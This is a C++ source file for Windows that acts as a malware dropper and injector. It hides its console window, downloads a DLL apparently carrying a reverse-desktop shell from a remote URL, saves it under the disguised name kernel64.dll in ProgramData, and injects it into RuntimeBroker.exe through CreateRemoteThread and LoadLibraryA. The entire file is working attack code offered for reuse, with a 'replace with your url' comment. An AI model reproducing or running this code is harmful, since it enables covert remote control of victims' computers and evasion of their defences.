#include <windows.h>
#include <Psapi.h>
#include <vector>
#include <wininet.h>
#include <string>
#include <urlmon.h>
#include <Shlobj.h>

#pragma comment(lib, "Urlmon.lib")
#pragma comment(lib, "Wininet.lib")

std::vector<DWORD> pid;
HANDLE hProcess;
DWORD addrProcess;

std::vector<DWORD> getProcesses()
{
	std::vector<DWORD> PID;
	DWORD ptr, processes[1024];
	EnumProcesses(processes, sizeof(processes), new DWORD);
	for (auto process : processes)
	{
		if (process == 3435973836) break;
		else if (process != 0) PID.push_back(process);
	}
	return PID;
}

int main(int argc, const char* argv[])
{
	ShowWindow(GetConsoleWindow(), NULL);
	const CHAR url[] = "https://github.com/noahehrnstrom/dllinject_reverse_shell/blob/main/bin/reverse_desktop.dll?raw=true"; // replace with your url
	char path[MAX_PATH];
	SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, 0, path);
	std::string filePath = path;
	filePath += "\\kernel64.dll";
	DeleteUrlCacheEntryA(url);

	HRESULT hr = URLDownloadToFileA(
		NULL,
		url,
		filePath.c_str(),
		0,
		NULL);

	if (!SUCCEEDED(hr))
	{
		return -1;
	}

	pid = getProcesses();
	WCHAR szProcessName[MAX_PATH];
	HMODULE hMod[1024];
	for (auto& curpid : pid)
	{
		HANDLE curProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, curpid);
		if (EnumProcessModules(curProcess, hMod, sizeof(hMod), new DWORD))
		{
			GetModuleBaseName(curProcess, hMod[0], szProcessName,
				sizeof(szProcessName) / sizeof(WCHAR));
			if (wcscmp(szProcessName, L"RuntimeBroker.exe") == 0)
			{
				hProcess = curProcess;
				addrProcess = (DWORD)hMod[0];
				break;
			}
		}
	}

	std::string DllPath = filePath;

	LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(DllPath.c_str()) + 1,
		MEM_COMMIT, PAGE_READWRITE);

	WriteProcessMemory(hProcess, pDllPath, (LPVOID)DllPath.c_str(),
		strlen(DllPath.c_str()) + 1, 0);

	HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
		(LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"),
			"LoadLibraryA"), pDllPath, 0, 0);

	WaitForSingleObject(hLoadThread, INFINITE);

	VirtualFreeEx(hProcess, pDllPath, strlen(DllPath.c_str()) + 1, MEM_RELEASE);

	return 0;
}
